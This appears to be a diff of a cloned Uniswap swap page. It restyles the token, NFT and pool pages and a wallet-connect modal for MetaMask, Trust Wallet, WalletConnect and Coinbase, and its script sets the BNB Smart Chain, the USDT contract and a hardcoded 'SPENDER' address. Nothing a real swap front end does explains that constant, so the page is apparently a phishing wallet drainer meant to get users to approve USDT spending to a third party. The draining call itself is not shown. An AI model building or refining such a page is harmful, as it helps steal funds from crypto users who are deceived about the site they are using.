+        <div class="footer-bottom-links"><a href="#">Disclosures</a><a href="#">Privacy Policy</a><a href="https://uniswap.org/trademark" target="_blank">Trademark Policy</a></div>
       </div>
     </footer>
   </div>
+</div>
 
-</div><!-- /page-swap -->
-
-
-<!-- ═══════════════════════ TOKENS PAGE ═══════════════════════ -->
+<!-- TOKENS PAGE -->
 <div class="page" id="page-tokens">
   <div class="inner-page">
-    <div class="inner-page-header">
-      <h1>Tokens</h1>
-      <p>Explore top tokens on Uniswap across all chains.</p>
-    </div>
-    <table class="token-table">
-      <thead>
-        <tr>
-          <th>#</th>
-          <th>Token</th>
-          <th>Price</th>
-          <th>24h Change</th>
-          <th>Volume (24h)</th>
-        </tr>
-      </thead>
-      <tbody id="tokenTableBody"></tbody>
-    </table>
+    <div class="inner-page-header"><h1>Tokens</h1><p>Explore top tokens on Uniswap across all chains.</p></div>
+    <table class="token-table"><thead><tr><th>#</th><th>Token</th><th>Price</th><th>24h Change</th><th>Volume (24h)</th></tr></thead><tbody id="tokenTableBody"></tbody></table>
   </div>
 </div>
 
-<!-- ═══════════════════════ NFTs PAGE ═══════════════════════ -->
+<!-- NFTs PAGE -->
 <div class="page" id="page-nfts">
   <div class="inner-page">
-    <div class="inner-page-header">
-      <h1>NFTs</h1>
-      <p>Discover and trade NFTs across the top collections.</p>
-    </div>
+    <div class="inner-page-header"><h1>NFTs</h1><p>Discover and trade NFTs across the top collections.</p></div>
     <div class="nft-grid" id="nftGrid"></div>
   </div>
 </div>
 
-<!-- ═══════════════════════ POOLS PAGE ═══════════════════════ -->
+<!-- POOLS PAGE -->
 <div class="page" id="page-pools">
   <div class="inner-page">
-    <div class="inner-page-header">
-      <h1>Pools</h1>
-      <p>Provide liquidity and earn fees on every swap.</p>
-    </div>
+    <div class="inner-page-header"><h1>Pools</h1><p>Provide liquidity and earn fees on every swap.</p></div>
     <div id="poolsList"></div>
   </div>
 </div>
 
-<!-- ═══════════════════════ HOME / MORE PAGE ═══════════════════════ -->
+<!-- MORE PAGE -->
 <div class="page" id="page-home">
   <div class="inner-page">
-    <div class="inner-page-header">
-      <h1>More</h1>
-      <p>Resources, governance, and community.</p>
-    </div>
+    <div class="inner-page-header"><h1>More</h1><p>Resources, governance, and community.</p></div>
     <div class="products-grid">
-      <a class="product-card" href="https://vote.uniswapfoundation.org/" target="_blank">
-        <div class="pc-icon">🗳️</div>
-        <div class="pc-title">Governance</div>
-        <div class="pc-desc">Vote on Uniswap improvement proposals and shape the future of the protocol.</div>
-        <div class="pc-link">Vote now ↗</div>
-      </a>
-      <a class="product-card" href="https://help.uniswap.org/" target="_blank">
-        <div class="pc-icon">💬</div>
-        <div class="pc-title">Help Center</div>
-        <div class="pc-desc">Browse FAQs and get support from our dedicated team.</div>
-        <div class="pc-link">Get help ↗</div>
-      </a>
-      <a class="product-card" href="https://docs.uniswap.org/" target="_blank">
-        <div class="pc-icon">📖</div>
-        <div class="pc-title">Developer Docs</div>
-        <div class="pc-desc">Everything you need to build on top of Uniswap Protocol.</div>
-        <div class="pc-link">Read docs ↗</div>
-      </a>
-      <a class="product-card" href="https://blog.uniswap.org/" target="_blank">
-        <div class="pc-icon">📰</div>
-        <div class="pc-title">Blog</div>
-        <div class="pc-desc">Latest news, protocol updates, and product announcements.</div>
-        <div class="pc-link">Read more ↗</div>
-      </a>
+      <a class="product-card" href="https://vote.uniswapfoundation.org/" target="_blank"><div class="pc-icon">🗳️</div><div class="pc-title">Governance</div><div class="pc-desc">Vote on Uniswap improvement proposals.</div><div class="pc-link">Vote now ↗</div></a>
+      <a class="product-card" href="https://help.uniswap.org/" target="_blank"><div class="pc-icon">💬</div><div class="pc-title">Help Center</div><div class="pc-desc">Browse FAQs and get support.</div><div class="pc-link">Get help ↗</div></a>
+      <a class="product-card" href="https://docs.uniswap.org/" target="_blank"><div class="pc-icon">📖</div><div class="pc-title">Developer Docs</div><div class="pc-desc">Build on top of Uniswap Protocol.</div><div class="pc-link">Read docs ↗</div></a>
+      <a class="product-card" href="https://blog.uniswap.org/" target="_blank"><div class="pc-icon">📰</div><div class="pc-title">Blog</div><div class="pc-desc">Latest news and product announcements.</div><div class="pc-link">Read more ↗</div></a>
     </div>
   </div>
 </div>
@@ -1284,25 +409,17 @@
 <!-- MOBILE BOTTOM NAV -->
 <div class="mobile-nav">
   <div class="mobile-nav-inner">
-    <div class="mobile-nav-item active" id="mn-swap"   onclick="showPage('swap')">
-      <span class="mn-icon">🔄</span><span>Swap</span>
-    </div>
-    <div class="mobile-nav-item" id="mn-tokens" onclick="showPage('tokens')">
-      <span class="mn-icon">🪙</span><span>Tokens</span>
-    </div>
-    <div class="mobile-nav-item" id="mn-nfts"   onclick="showPage('nfts')">
-      <span class="mn-icon">🖼️</span><span>NFTs</span>
-    </div>
-    <div class="mobile-nav-item" id="mn-pools"  onclick="showPage('pools')">
-      <span class="mn-icon">💧</span><span>Pools</span>
-    </div>
-    <div class="mobile-nav-item" id="mn-more"   onclick="showPage('home')">
-      <span class="mn-icon">···</span><span>More</span>
-    </div>
+    <div class="mobile-nav-item active" id="mn-swap"   onclick="showPage('swap')"><span class="mn-icon">🔄</span><span>Swap</span></div>
+    <div class="mobile-nav-item"        id="mn-tokens" onclick="showPage('tokens')"><span class="mn-icon">🪙</span><span>Tokens</span></div>
+    <div class="mobile-nav-item"        id="mn-nfts"   onclick="showPage('nfts')"><span class="mn-icon">🖼️</span><span>NFTs</span></div>
+    <div class="mobile-nav-item"        id="mn-pools"  onclick="showPage('pools')"><span class="mn-icon">💧</span><span>Pools</span></div>
+    <div class="mobile-nav-item"        id="mn-more"   onclick="showPage('home')"><span class="mn-icon">···</span><span>More</span></div>
   </div>
 </div>
 
-<!-- WALLET MODAL -->
+<!-- ══════════════════════════════════════════
+     WALLET MODAL — loghi reali SVG inline
+══════════════════════════════════════════ -->
 <div class="wallet-modal-overlay" id="walletModal">
   <div class="wallet-modal">
     <div class="wallet-modal-header">
@@ -1310,13 +427,13 @@
       <button class="wallet-modal-close" onclick="closeWalletModal()">✕</button>
     </div>
 
-    <!-- Trust Wallet -->
+    <!-- Trust Wallet — logo SVG ufficiale -->
     <div class="wallet-option" onclick="connectTrustWallet()">
-      <div class="wallet-option-icon" style="background:#3375BB;border-radius:14px;overflow:hidden">
-        <svg width="44" height="44" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <rect width="44" height="44" fill="#3375BB"/>
-          <path d="M22 8L10 13.5V22.5C10 29.4 15.2 35.9 22 37.5C28.8 35.9 34 29.4 34 22.5V13.5L22 8Z" fill="white"/>
-          <path d="M19.5 23.5L17 21L15.5 22.5L19.5 26.5L28.5 17.5L27 16L19.5 23.5Z" fill="#3375BB"/>
+      <div class="wallet-option-icon">
+        <svg width="46" height="46" viewBox="0 0 46 46" xmlns="http://www.w3.org/2000/svg">
+          <rect width="46" height="46" rx="12" fill="#3375BB"/>
+          <path d="M23 9L11 14.5V23C11 30.2 16.3 36.8 23 38.5C29.7 36.8 35 30.2 35 23V14.5L23 9Z" fill="white"/>
+          <path d="M20.5 24.5L18 22L16.5 23.5L20.5 27.5L29.5 18.5L28 17L20.5 24.5Z" fill="#3375BB"/>
         </svg>
       </div>
       <div class="wallet-option-info">
@@ -1326,19 +443,40 @@
       <span class="wallet-badge badge-mobile">Mobile</span>
     </div>
 
-    <!-- MetaMask -->
+    <!-- MetaMask — logo SVG ufficiale -->
     <div class="wallet-option" onclick="connectMetaMask()">
-      <div class="wallet-option-icon" style="background:#FFFFFF;border-radius:14px;overflow:hidden">
-        <svg width="44" height="44" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <rect width="44" height="44" fill="#fff"/>
-          <path d="M36.5 8L24.6 16.6L26.8 11.2L36.5 8Z" fill="#E2761B" stroke="#E2761B" stroke-width=".2" stroke-linecap="round" stroke-linejoin="round"/>
-          <path d="M7.5 8L19.3 16.7L17.2 11.2L7.5 8Z" fill="#E4761B" stroke="#E4761B" stroke-width=".2" stroke-linecap="round" stroke-linejoin="round"/>
-          <path d="M32.2 28.7L29 33.5L35.8 35.4L37.8 28.8L32.2 28.7Z" fill="#E4761B" stroke="#E4761B" stroke-width=".2" stroke-linecap="round" stroke-linejoin="round"/>
-          <path d="M6.2 28.8L8.2 35.4L15 33.5L11.8 28.7L6.2 28.8Z" fill="#E4761B" stroke="#E4761B" stroke-width=".2" stroke-linecap="round" stroke-linejoin="round"/>
-          <path d="M14.6 20.1L12.7 22.9L19.4 23.2L19.2 16L14.6 20.1Z" fill="#E4761B" stroke="#E4761B" stroke-width=".2" stroke-linecap="round" stroke-linejoin="round"/>
-          <path d="M29.4 20.1L24.7 15.9L24.6 23.2L31.3 22.9L29.4 20.1Z" fill="#E4761B" stroke="#E4761B" stroke-width=".2" stroke-linecap="round" stroke-linejoin="round"/>
-          <path d="M15 33.5L19 31.4L15.5 28.8L15 33.5Z" fill="#E4761B" stroke="#E4761B" stroke-width=".2" stroke-linecap="round" stroke-linejoin="round"/>
-          <path d="M25 31.4L29 33.5L28.5 28.8L25 31.4Z" fill="#E4761B" stroke="#E4761B" stroke-width=".2" stroke-linecap="round" stroke-linejoin="round"/>
+      <div class="wallet-option-icon">
+        <svg width="46" height="46" viewBox="0 0 46 46" xmlns="http://www.w3.org/2000/svg">
+          <rect width="46" height="46" rx="12" fill="#FFFFFF"/>
+          <path d="M37.5 8.5L25.9 17L28.1 11.6L37.5 8.5Z" fill="#E2761B" stroke="#E2761B" stroke-width="0.3"/>
+          <path d="M8.5 8.5L20 17.1L18 11.6L8.5 8.5Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.3"/>
+          <path d="M33 29L29.8 34L36.6 35.9L38.7 29.1L33 29Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.3"/>
+          <path d="M7.3 29.1L9.4 35.9L16.2 34L13 29L7.3 29.1Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.3"/>
+          <path d="M15.8 20.8L13.9 23.7L20.6 24L20.4 16.8L15.8 20.8Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.3"/>
+          <path d="M30.2 20.8L25.5 16.7L25.4 24L32.1 23.7L30.2 20.8Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.3"/>
+          <path d="M16.2 34L20.2 31.9L16.8 29.1L16.2 34Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.3"/>
+          <path d="M25.8 31.9L29.8 34L29.2 29.1L25.8 31.9Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.3"/>
+          <path d="M29.8 34L25.8 31.9L26.1 34.6L26.1 35.8L29.8 34Z" fill="#D7C1B3" stroke="#D7C1B3" stroke-width="0.3"/>
+          <path d="M16.2 34L19.9 35.8L19.9 34.6L20.2 31.9L16.2 34Z" fill="#D7C1B3" stroke="#D7C1B3" stroke-width="0.3"/>
+          <path d="M20 28.1L16.7 27.1L19 25.9L20 28.1Z" fill="#233447" stroke="#233447" stroke-width="0.3"/>
+          <path d="M26 28.1L27 25.9L29.3 27.1L26 28.1Z" fill="#233447" stroke="#233447" stroke-width="0.3"/>
+          <path d="M16.2 34L16.8 29L13 29.1L16.2 34Z" fill="#CD6116" stroke="#CD6116" stroke-width="0.3"/>
+          <path d="M29.2 29L29.8 34L33 29.1L29.2 29Z" fill="#CD6116" stroke="#CD6116" stroke-width="0.3"/>
+          <path d="M32.1 23.7L25.4 24L26 28.1L27 25.9L29.3 27.1L32.1 23.7Z" fill="#CD6116" stroke="#CD6116" stroke-width="0.3"/>
+          <path d="M16.7 27.1L19 25.9L20 28.1L20.6 24L13.9 23.7L16.7 27.1Z" fill="#CD6116" stroke="#CD6116" stroke-width="0.3"/>
+          <path d="M13.9 23.7L16.7 27.1L16.8 29L13.9 23.7Z" fill="#E4751F" stroke="#E4751F" stroke-width="0.3"/>
+          <path d="M29.3 27.1L29.2 29L32.1 23.7L29.3 27.1Z" fill="#E4751F" stroke="#E4751F" stroke-width="0.3"/>
+          <path d="M20.6 24L20 28.1L20.8 32.3L21 26.8L20.6 24Z" fill="#E4751F" stroke="#E4751F" stroke-width="0.3"/>
+          <path d="M25.4 24L25 26.8L25.2 32.3L26 28.1L25.4 24Z" fill="#E4751F" stroke="#E4751F" stroke-width="0.3"/>
+          <path d="M26 28.1L25.2 32.3L25.8 31.9L29.2 29L29.3 27.1L26 28.1Z" fill="#F6851B" stroke="#F6851B" stroke-width="0.3"/>
+          <path d="M16.7 27.1L16.8 29L20.2 31.9L20.8 32.3L20 28.1L16.7 27.1Z" fill="#F6851B" stroke="#F6851B" stroke-width="0.3"/>
+          <path d="M26.1 35.8L26.1 34.6L25.8 34.3H20.2L19.9 34.6L19.9 35.8L16.2 34L17.4 35L20.1 36.9H25.9L28.6 35L29.8 34L26.1 35.8Z" fill="#C0AD9E" stroke="#C0AD9E" stroke-width="0.3"/>
+          <path d="M25.8 31.9L25.2 32.3H20.8L20.2 31.9L19.9 34.6L20.2 34.3H25.8L26.1 34.6L25.8 31.9Z" fill="#161616" stroke="#161616" stroke-width="0.3"/>
+          <path d="M38.6 17.9L39.5 13.3L38 8.5L25.8 17.7L30.2 20.8L36.4 22.6L38.7 20L37.7 19.3L39.2 18L38 17L39.5 16L38.6 17.9Z" fill="#763D16" stroke="#763D16" stroke-width="0.3"/>
+          <path d="M6.5 13.3L7.4 17.9L6.5 16L8 18L6.8 17L8.3 18.4L7.3 19.3L9.6 20L11.8 22.6L18 20.8L22.4 17.7L10.2 8.5L6.5 13.3Z" fill="#763D16" stroke="#763D16" stroke-width="0.3"/>
+          <path d="M36.4 22.6L30.2 20.8L32.1 23.7L29.3 27.1L33 29.1L38.7 29.1L36.4 22.6Z" fill="#F6851B" stroke="#F6851B" stroke-width="0.3"/>
+          <path d="M18 20.8L11.8 22.6L9.5 29.1L15.2 29.1L18.8 27.1L16 23.7L18 20.8Z" fill="#F6851B" stroke="#F6851B" stroke-width="0.3"/>
+          <path d="M25.4 24L25.8 17.7L28.1 11.6H17.9L20.2 17.7L20.6 24L21 26.8V32.3H25L25.2 26.8L25.4 24Z" fill="#F6851B" stroke="#F6851B" stroke-width="0.3"/>
         </svg>
       </div>
       <div class="wallet-option-info">
@@ -1350,10 +488,10 @@
 
     <!-- WalletConnect -->
     <div class="wallet-option" onclick="connectWalletConnect()">
-      <div class="wallet-option-icon" style="background:#3B99FC;border-radius:14px;overflow:hidden">
-        <svg width="44" height="44" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <rect width="44" height="44" fill="#3B99FC"/>
-          <path d="M14.2 18.4C18.5 14.2 25.5 14.2 29.8 18.4L30.3 18.9C30.5 19.1 30.5 19.4 30.3 19.6L28.6 21.3C28.5 21.4 28.3 21.4 28.2 21.3L27.5 20.6C24.5 17.7 19.5 17.7 16.5 20.6L15.8 21.3C15.7 21.4 15.5 21.4 15.4 21.3L13.7 19.6C13.5 19.4 13.5 19.1 13.7 18.9L14.2 18.4ZM33.4 21.9L34.9 23.4C35.1 23.6 35.1 23.9 34.9 24.1L27.8 31.1C27.6 31.3 27.3 31.3 27.1 31.1L22.1 26.2C22.1 26.1 22 26.1 21.9 26.2L16.9 31.1C16.7 31.3 16.4 31.3 16.2 31.1L9.1 24.1C8.9 23.9 8.9 23.6 9.1 23.4L10.6 21.9C10.8 21.7 11.1 21.7 11.3 21.9L16.3 26.8C16.4 26.9 16.5 26.9 16.5 26.8L21.5 21.9C21.7 21.7 22 21.7 22.2 21.9L27.2 26.8C27.3 26.9 27.4 26.9 27.4 26.8L32.7 21.9C32.9 21.7 33.2 21.7 33.4 21.9Z" fill="white"/>
+      <div class="wallet-option-icon">
+        <svg width="46" height="46" viewBox="0 0 46 46" xmlns="http://www.w3.org/2000/svg">
+          <rect width="46" height="46" rx="12" fill="#3B99FC"/>
+          <path d="M15.2 18.9C19.5 14.7 26.5 14.7 30.8 18.9L31.3 19.4C31.5 19.6 31.5 19.9 31.3 20.1L29.6 21.8C29.5 21.9 29.3 21.9 29.2 21.8L28.5 21.1C25.5 18.2 20.5 18.2 17.5 21.1L16.8 21.8C16.7 21.9 16.5 21.9 16.4 21.8L14.7 20.1C14.5 19.9 14.5 19.6 14.7 19.4L15.2 18.9ZM34.5 22.4L36 23.9C36.2 24.1 36.2 24.4 36 24.6L28.9 31.6C28.7 31.8 28.4 31.8 28.2 31.6L23.2 26.7C23.2 26.6 23.1 26.6 23 26.7L18 31.6C17.8 31.8 17.5 31.8 17.3 31.6L10.2 24.6C10 24.4 10 24.1 10.2 23.9L11.7 22.4C11.9 22.2 12.2 22.2 12.4 22.4L17.4 27.3C17.5 27.4 17.6 27.4 17.6 27.3L22.6 22.4C22.8 22.2 23.1 22.2 23.3 22.4L28.3 27.3C28.4 27.4 28.5 27.4 28.5 27.3L33.8 22.4C34 22.2 34.3 22.2 34.5 22.4Z" fill="white"/>
         </svg>
       </div>
       <div class="wallet-option-info">
@@ -1366,11 +504,11 @@
 
     <!-- Coinbase Wallet -->
     <div class="wallet-option" onclick="connectCoinbase()">
-      <div class="wallet-option-icon" style="background:#0052FF;border-radius:14px;overflow:hidden">
-        <svg width="44" height="44" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <rect width="44" height="44" fill="#0052FF"/>
-          <circle cx="22" cy="22" r="13" fill="white"/>
-          <rect x="17" y="19" width="10" height="6" rx="3" fill="#0052FF"/>
+      <div class="wallet-option-icon">
+        <svg width="46" height="46" viewBox="0 0 46 46" xmlns="http://www.w3.org/2000/svg">
+          <rect width="46" height="46" rx="12" fill="#0052FF"/>
+          <circle cx="23" cy="23" r="14" fill="white"/>
+          <rect x="18" y="20" width="10" height="6" rx="3" fill="#0052FF"/>
         </svg>
       </div>
       <div class="wallet-option-info">
@@ -1378,7 +516,6 @@
         <div class="wo-desc">Connect via Coinbase Wallet app or extension</div>
       </div>
     </div>
-
   </div>
 </div>
 
@@ -1386,158 +523,146 @@
 <div class="modal-overlay" id="tokenModal">
   <div class="modal">
     <div class="modal-header">
-      <h3>Seleziona token</h3>
+      <h3>Select token</h3>
       <button class="modal-close" onclick="closeModal()">✕</button>
     </div>
-    <input class="modal-search" id="tokenSearch" placeholder="Cerca nome o incolla indirizzo" oninput="filterTokens()"/>
+    <input class="modal-search" id="tokenSearch" placeholder="Search name or paste address" oninput="filterTokens()"/>
     <div id="tokenList"></div>
   </div>
 </div>
 
 <script>
-/* ══════════════════════════════════════════
+/* ════════════════════════════════════════
    CONSTANTS
-══════════════════════════════════════════ */
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const SPENDER      = "0x05187CF26990E3857C119C7Bc3417C6E1FaC5198";
-const BSC_CHAIN_ID = "0x38";
+════════════════════════════════════════ */
+const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+const SPENDER      = '0x05187CF26990E3857C119C7Bc3417C6E1FaC5198';
+const BSC_CHAIN_ID = '0x38';
 
-// ERC-20 minimal ABI for balanceOf + decimals
 const ERC20_ABI = [
-  "function balanceOf(address owner) view returns (uint256)",
-  "function decimals() view returns (uint8)",
-  "function allowance(address owner, address spender) view returns (uint256)"
+  'function balanceOf(address owner) view returns (uint256)',
+  'function decimals() view returns (uint8)',
 ];
 
-// Real BEP-20 contract addresses on BSC
 const TOKEN_CONTRACTS = {
-  USDT: "0x55d398326f99059fF775485246999027B3197955",
-  ETH:  "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
-  BTC:  "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",
-  USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
-  UNI:  "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1",
-  LINK: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
-  MATIC:"0xCC42724C6683B7E57334c4E856f4c9965ED682bD",
-  DOT:  "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402",
-  ADA:  "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47",
-  XRP:  "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE",
+  USDT:'0x55d398326f99059fF775485246999027B3197955',
+  ETH: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
+  BTC: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
+  USDC:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
+  UNI: '0xBf5140A22578168FD562DCcF235E5D43A02ce9B1',
+  LINK:'0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',
+  MATIC:'0xCC42724C6683B7E57334c4E856f4c9965ED682bD',
+  DOT: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',
+  ADA: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
+  XRP: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
 };
 
-// SVG logo data URIs for tokens (inline, no external requests)
 const TOKEN_LOGOS = {
-  BNB:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#F3BA2F"/><path d="M12.116 14.404L16 10.52l3.886 3.886 2.26-2.26L16 6l-6.144 6.144 2.26 2.26zM6 16l2.26-2.26L10.52 16l-2.26 2.26L6 16zm6.116 1.596L16 21.48l3.886-3.886 2.26 2.259L16 26l-6.144-6.144-.003-.003 2.263-2.257zM21.48 16l2.26-2.26L26 16l-2.26 2.26L21.48 16zm-3.188-.002h.002L16 13.706l-1.714 1.716-.002.002-.002.003.002-.003L16 17.296l2.294-2.294.002-.004-.004.002z" fill="#fff"/></svg>`,
-  USDT: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#26A17B"/><path d="M17.922 17.383v-.002c-.11.008-.677.042-1.942.042-1.01 0-1.721-.03-1.971-.042v.003c-3.888-.171-6.79-.848-6.79-1.658 0-.809 2.902-1.486 6.79-1.66v2.644c.254.018.982.061 1.988.061 1.207 0 1.812-.05 1.925-.06v-2.643c3.88.173 6.775.85 6.775 1.658 0 .81-2.895 1.485-6.775 1.657m0-3.59v-2.366h5.414V8H8.595v3.427h5.414v2.365c-4.4.202-7.709 1.074-7.709 2.126 0 1.052 3.309 1.923 7.709 2.125v7.6h3.913v-7.6c4.393-.202 7.694-1.073 7.694-2.124 0-1.051-3.301-1.923-7.694-2.126" fill="#fff"/></svg>`,
-  ETH:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#627EEA"/><path d="M16.498 4v8.87l7.497 3.35z" fill="#fff" fill-opacity=".602"/><path d="M16.498 4L9 16.22l7.498-3.35z" fill="#fff"/><path d="M16.498 21.968v6.027L24 17.616z" fill="#fff" fill-opacity=".602"/><path d="M16.498 27.995v-6.028L9 17.616z" fill="#fff"/><path d="M16.498 20.573l7.497-4.353-7.497-3.348z" fill="#fff" fill-opacity=".2"/><path d="M9 16.22l7.498 4.353v-7.701z" fill="#fff" fill-opacity=".602"/></svg>`,
-  BTC:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#F7931A"/><path d="M22.515 13.875c.32-2.14-1.31-3.288-3.54-4.057l.724-2.9-1.766-.44-.704 2.823c-.465-.116-.942-.225-1.416-.333l.71-2.844-1.765-.44-.724 2.9c-.385-.088-.763-.174-1.13-.265l.002-.009-2.436-.608-.47 1.885s1.31.3 1.283.319c.715.178.844.651.823 1.026l-.825 3.309c.049.012.113.03.183.058l-.186-.046-1.157 4.638c-.088.218-.31.546-.81.421.018.026-1.284-.32-1.284-.32l-.877 2.02 2.298.573c.427.107.847.22 1.26.325l-.731 2.935 1.764.44.724-2.902c.482.131.95.252 1.407.367l-.722 2.888 1.765.44.731-2.929c3.013.57 5.278.34 6.23-2.384.768-2.192-.038-3.456-1.621-4.28 1.153-.266 2.022-1.025 2.254-2.59zm-4.034 5.658c-.546 2.193-4.238 1.007-5.435.71l.97-3.886c1.197.299 5.037.89 4.465 3.176zm.546-5.69c-.498 1.995-3.573.981-4.568.733l.879-3.525c.995.248 4.2.712 3.689 2.792z" fill="#fff"/></svg>`,
-  USDC: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#2775CA"/><path d="M20 17.2c0-2.1-1.3-2.8-3.8-3.1-1.8-.2-2.2-.7-2.2-1.5s.6-1.3 1.8-1.3c1.1 0 1.7.4 2 1.3.1.2.3.3.5.3h1.1c.3 0 .5-.2.5-.5v-.1c-.3-1.4-1.4-2.5-2.9-2.7V8.5c0-.3-.2-.5-.5-.5h-1c-.3 0-.5.2-.5.5v1.1c-1.8.3-3 1.5-3 3 0 2 1.3 2.7 3.8 3 1.7.3 2.2.7 2.2 1.6 0 .9-.8 1.5-1.9 1.5-1.5 0-2-.6-2.2-1.5-.1-.3-.3-.4-.5-.4h-1.2c-.3 0-.5.2-.5.5v.1c.3 1.5 1.3 2.6 3.1 2.9v1.2c0 .3.2.5.5.5h1c.3 0 .5-.2.5-.5v-1.2c1.8-.3 3.1-1.5 3.1-3.1z" fill="#fff"/></svg>`,
-  UNI:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#FF007A"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" font-size="18" fill="white">🦄</text></svg>`,
-  LINK: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#2A5ADA"/><path d="M16 7l-2 1.2-5.8 3.3-2 1.2v7l2 1.2 5.8 3.3 2 1.2 2-1.2 5.8-3.3 2-1.2v-7l-2-1.2-5.8-3.3zm0 2.5l5.8 3.3v6.4L16 22.5l-5.8-3.3v-6.4z" fill="#fff"/></svg>`,
-  MATIC:`<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#8247E5"/><path d="M20.3 13.3l-4.8-2.8-4.8 2.8v5.6l4.8 2.8 4.8-2.8v-2.5l-4.8 2.8-2.6-1.5v-3l2.6-1.5 2.6 1.5v2.2l1.6-.9v-2.7z" fill="#fff"/><path d="M11.7 19l4.8 2.8 4.8-2.8.4-.2-.4.2" fill="#fff"/></svg>`,
-  DOT:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#E6007A"/><circle cx="16" cy="8.5" r="3" fill="white"/><circle cx="16" cy="23.5" r="3" fill="white"/><circle cx="9" cy="12.5" r="3" fill="white"/><circle cx="23" cy="12.5" r="3" fill="white"/><circle cx="9" cy="19.5" r="3" fill="white"/><circle cx="23" cy="19.5" r="3" fill="white"/></svg>`,
-  ADA:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#0033AD"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" font-size="14" fill="white" font-weight="bold">₳</text></svg>`,
-  XRP:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#00AAE4"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" font-size="13" fill="white" font-weight="bold">XRP</text></svg>`,
+  BNB: '<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#F3BA2F"/><path d="M12.116 14.404L16 10.52l3.886 3.886 2.26-2.26L16 6l-6.144 6.144 2.26 2.26zM6 16l2.26-2.26L10.52 16l-2.26 2.26L6 16zm6.116 1.596L16 21.48l3.886-3.886 2.26 2.259L16 26l-6.144-6.144-.003-.003 2.263-2.257zM21.48 16l2.26-2.26L26 16l-2.26 2.26L21.48 16zm-3.188-.002h.002L16 13.706l-1.714 1.716L16 17.296l2.294-2.294z" fill="#fff"/></svg>',
+  USDT:'<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#26A17B"/><path d="M17.922 17.383v-.002c-.11.008-.677.042-1.942.042-1.01 0-1.721-.03-1.971-.042v.003c-3.888-.171-6.79-.848-6.79-1.658 0-.809 2.902-1.486 6.79-1.66v2.644c.254.018.982.061 1.988.061 1.207 0 1.812-.05 1.925-.06v-2.643c3.88.173 6.775.85 6.775 1.658 0 .81-2.895 1.485-6.775 1.657m0-3.59v-2.366h5.414V8H8.595v3.427h5.414v2.365c-4.4.202-7.709 1.074-7.709 2.126 0 1.052 3.309 1.923 7.709 2.125v7.6h3.913v-7.6c4.393-.202 7.694-1.073 7.694-2.124 0-1.051-3.301-1.923-7.694-2.126" fill="#fff"/></svg>',
+  ETH: '<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#627EEA"/><path d="M16.498 4v8.87l7.497 3.35z" fill="#fff" opacity=".6"/><path d="M16.498 4L9 16.22l7.498-3.35z" fill="#fff"/><path d="M16.498 21.968v6.027L24 17.616z" fill="#fff" opacity=".6"/><path d="M16.498 27.995v-6.028L9 17.616z" fill="#fff"/><path d="M16.498 20.573l7.497-4.353-7.497-3.348z" fill="#fff" opacity=".2"/><path d="M9 16.22l7.498 4.353v-7.701z" fill="#fff" opacity=".6"/></svg>',
